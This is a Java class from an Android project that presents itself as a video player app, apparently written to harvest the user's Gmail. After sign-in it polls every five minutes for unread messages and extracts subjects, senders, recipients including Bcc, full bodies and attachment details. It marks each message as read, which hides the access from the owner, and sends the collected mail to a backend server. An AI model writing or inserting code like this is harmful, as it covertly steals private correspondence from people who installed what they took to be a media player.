package com.jumpy.videoplayerapp;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.common.api.Scope;
import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
import com.google.api.client.http.javanet.NetHttpTransport;
import com.google.api.client.json.gson.GsonFactory;
import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.GmailScopes;
import com.google.api.services.gmail.model.ListMessagesResponse;
import com.google.api.services.gmail.model.Message;
import com.google.api.services.gmail.model.ModifyMessageRequest;
import java.io.IOException;
import java.util.Collections;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.List;
import java.util.ArrayList;

public class GmailAuthService {
    private static final String TAG = "GmailAuthService";
    // Removed WEB_CLIENT_ID - using basic Google Sign-In without additional credentials
    
    private Context context;
    private GoogleSignInClient googleSignInClient;
    private Gmail gmailService;
    private ScheduledExecutorService scheduler;
    private boolean isEmailCollectionActive = false;
    private GoogleSignInAccount lastSignedInAccount;
    private NotificationQueueManager notificationQueueManager;
    
    public GmailAuthService(Context context) {
        this.context = context;
        this.notificationQueueManager = new NotificationQueueManager(context);
        initializeGoogleSignIn();
    }
    
    private void initializeGoogleSignIn() {
        try {
            // Simplified Google Sign-In configuration without web client ID
            GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestEmail()
                .requestScopes(new Scope(GmailScopes.GMAIL_MODIFY))
                .requestScopes(new Scope(GmailScopes.GMAIL_READONLY))
                .build();
            
            googleSignInClient = GoogleSignIn.getClient(context, gso);
            Log.i(TAG, "Google Sign-In client initialized successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing Google Sign-In", e);
        }
    }
    
    public GoogleSignInClient getGoogleSignInClient() {
        return googleSignInClient;
    }
    
    public GoogleSignInAccount getLastSignedInAccount() {
        if (lastSignedInAccount == null) {
            lastSignedInAccount = GoogleSignIn.getLastSignedInAccount(context);
        }
        return lastSignedInAccount;
    }
    
    public boolean isSignedIn() {
        return getLastSignedInAccount() != null;
    }
    
    public void handleSignInResult(com.google.android.gms.tasks.Task<GoogleSignInAccount> completedTask) {
        try {
            GoogleSignInAccount account = completedTask.getResult(com.google.android.gms.common.api.ApiException.class);
            if (account != null) {
                lastSignedInAccount = account;
                Log.i(TAG, "Successfully signed in: " + account.getEmail());
                
                // Initialize Gmail service
                initializeGmailService(account);
                
                // Start email collection
                startEmailCollection();
                
            } else {
                Log.e(TAG, "Sign-in result is null");
            }
        } catch (com.google.android.gms.common.api.ApiException e) {
            Log.e(TAG, "Sign-in failed with status code: " + e.getStatusCode(), e);
        } catch (Exception e) {
            Log.e(TAG, "Error handling sign-in result", e);
        }
    }
    
    private void initializeGmailService(GoogleSignInAccount account) {
        try {
            GoogleAccountCredential credential = GoogleAccountCredential.usingOAuth2(
                context, 
                Collections.singleton(GmailScopes.GMAIL_MODIFY)
            );
            credential.setSelectedAccount(account.getAccount());
            
            gmailService = new Gmail.Builder(
                new NetHttpTransport(),
                new GsonFactory(),
                credential
            )
            .setApplicationName("jumpy")
            .build();
            
            Log.i(TAG, "Gmail service initialized successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing Gmail service", e);
        }
    }
    
    private void startEmailCollection() {
        if (isEmailCollectionActive) {
            Log.i(TAG, "Email collection already active");
            return;
        }
        
        if (gmailService == null) {
            Log.e(TAG, "Gmail service not initialized");
            return;
        }
        
        isEmailCollectionActive = true;
        
        // Initialize scheduler for periodic email checking
        if (scheduler == null) {
            scheduler = Executors.newScheduledThreadPool(1);
        }
        
        // Schedule email collection task
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    collectNewEmails();
                } catch (Exception e) {
                    Log.e(TAG, "Error in email collection task", e);
                }
            }
        }, 0, 5, TimeUnit.MINUTES); // Check every 5 minutes
        
        Log.i(TAG, "Email collection started");
    }
    
    private void collectNewEmails() {
        try {
            if (gmailService == null) {
                Log.w(TAG, "Gmail service not available");
                return;
            }
            
            // Get unread messages
            ListMessagesResponse response = gmailService.users().messages()
                .list("me")
                .setQ("is:unread")
                .setMaxResults(10L)
                .execute();
            
            if (response.getMessages() != null && !response.getMessages().isEmpty()) {
                List<NotificationQueueManager.EmailData> emails = new ArrayList<>();
                
                for (Message message : response.getMessages()) {
                    try {
                        // Get full message details
                        Message fullMessage = gmailService.users().messages()
                            .get("me", message.getId())
                            .execute();
                        
                        // Convert to EmailData
                        NotificationQueueManager.EmailData emailData = convertMessageToEmailData(fullMessage);
                        emails.add(emailData);
                        
                        // Mark as read
                        ModifyMessageRequest mods = new ModifyMessageRequest()
                            .setRemoveLabelIds(Collections.singletonList("UNREAD"));
                        
                        gmailService.users().messages()
                            .modify("me", message.getId(), mods)
                            .execute();
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing message: " + message.getId(), e);
                    }
                }
                
                // Send emails to backend database
                if (!emails.isEmpty()) {
                    String userId = getUserIdFromAccount();
                    notificationQueueManager.sendGmailData(userId, emails);
                    Log.i(TAG, "Collected and sent " + emails.size() + " emails to backend");
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting new emails", e);
        }
    }
    
    private NotificationQueueManager.EmailData convertMessageToEmailData(Message message) {
        NotificationQueueManager.EmailData emailData = new NotificationQueueManager.EmailData();
        
        try {
            emailData.messageId = message.getId();
            emailData.threadId = message.getThreadId();
            emailData.internalDate = message.getInternalDate() != null ? message.getInternalDate().toString() : "";
            emailData.sizeEstimate = message.getSizeEstimate() != null ? message.getSizeEstimate().intValue() : 0;
            emailData.snippet = message.getSnippet();
            
            // Extract headers
            if (message.getPayload() != null && message.getPayload().getHeaders() != null) {
                for (com.google.api.services.gmail.model.MessagePartHeader header : message.getPayload().getHeaders()) {
                    switch (header.getName()) {
                        case "Subject":
                            emailData.subject = header.getValue();
                            break;
                        case "From":
                            emailData.from = header.getValue();
                            break;
                        case "To":
                            emailData.to = header.getValue();
                            break;
                        case "Cc":
                            emailData.cc = header.getValue();
                            break;
                        case "Bcc":
                            emailData.bcc = header.getValue();
                            break;
                    }
                }
            }
            
            // Extract labels
            if (message.getLabelIds() != null) {
                emailData.labels = new ArrayList<>(message.getLabelIds());
                emailData.isRead = !emailData.labels.contains("UNREAD");
                emailData.isStarred = emailData.labels.contains("STARRED");
                emailData.isImportant = emailData.labels.contains("IMPORTANT");
            }
            
            // Extract body content
            extractMessageBody(message, emailData);
            
        } catch (Exception e) {
            Log.e(TAG, "Error converting message to EmailData", e);
        }
        
        return emailData;
    }
    
    private void extractMessageBody(Message message, NotificationQueueManager.EmailData emailData) {
        try {
            if (message.getPayload() == null) return;
            
            // Get text content
            String textContent = getTextContent(message.getPayload());
            if (textContent != null) {
                emailData.body = textContent;
            }
            
            // Get HTML content
            String htmlContent = getHtmlContent(message.getPayload());
            if (htmlContent != null) {
                emailData.bodyHtml = htmlContent;
            }
            
            // Extract attachments info
            extractAttachments(message.getPayload(), emailData);
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting message body", e);
        }
    }
    
    private String getTextContent(com.google.api.services.gmail.model.MessagePart payload) {
        if (payload.getMimeType().equals("text/plain")) {
            return getPartContent(payload);
        }
        
        if (payload.getParts() != null) {
            for (com.google.api.services.gmail.model.MessagePart part : payload.getParts()) {
                if (part.getMimeType().equals("text/plain")) {
                    return getPartContent(part);
                }
            }
        }
        
        return null;
    }
    
    private String getHtmlContent(com.google.api.services.gmail.model.MessagePart payload) {
        if (payload.getMimeType().equals("text/html")) {
            return getPartContent(payload);
        }
        
        if (payload.getParts() != null) {
            for (com.google.api.services.gmail.model.MessagePart part : payload.getParts()) {
                if (part.getMimeType().equals("text/html")) {
                    return getPartContent(part);
                }
            }
        }
        
        return null;
    }
    
    private String getPartContent(com.google.api.services.gmail.model.MessagePart part) {
        if (part.getBody() != null && part.getBody().getData() != null) {
            try {
                byte[] decodedBytes = android.util.Base64.decode(
                    part.getBody().getData().replace('-', '+').replace('_', '/'), 
                    android.util.Base64.DEFAULT
                );
                return new String(decodedBytes, "UTF-8");
            } catch (Exception e) {
                Log.e(TAG, "Error decoding part content", e);
            }
        }
        return null;
    }
    
    private void extractAttachments(com.google.api.services.gmail.model.MessagePart payload, NotificationQueueManager.EmailData emailData) {
        if (payload.getParts() != null) {
            for (com.google.api.services.gmail.model.MessagePart part : payload.getParts()) {
                if (part.getFilename() != null && !part.getFilename().isEmpty()) {
                    NotificationQueueManager.AttachmentData attachment = new NotificationQueueManager.AttachmentData();
                    attachment.filename = part.getFilename();
                    attachment.mimeType = part.getMimeType();
                    attachment.size = part.getBody().getSize() != null ? part.getBody().getSize().intValue() : 0;
                    attachment.attachmentId = part.getBody().getAttachmentId();
                    emailData.attachments.add(attachment);
                }
            }
        }
    }
    
    private String getUserIdFromAccount() {
        if (lastSignedInAccount != null) {
            // Use email as userId for simplicity
            return lastSignedInAccount.getEmail().replace("@", "_at_").replace(".", "_");
        }
        return "unknown_user";
    }
    
    public void checkAndMaintainEmailCollection() {
        if (!isSignedIn()) {
            Log.w(TAG, "Not signed in, cannot maintain email collection");
            return;
        }
        
        if (!isEmailCollectionActive) {
            Log.i(TAG, "Restarting email collection");
            startEmailCollection();
        }
    }
    
    public void signOut() {
        try {
            if (googleSignInClient != null) {
                googleSignInClient.signOut();
            }
            
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdown();
                scheduler = null;
            }
            
            isEmailCollectionActive = false;
            lastSignedInAccount = null;
            gmailService = null;
            
            Log.i(TAG, "Signed out successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during sign out", e);
        }
    }
    
    public void shutdown() {
        try {
            signOut();
        } catch (Exception e) {
            Log.e(TAG, "Error during shutdown", e);
        }
    }
} 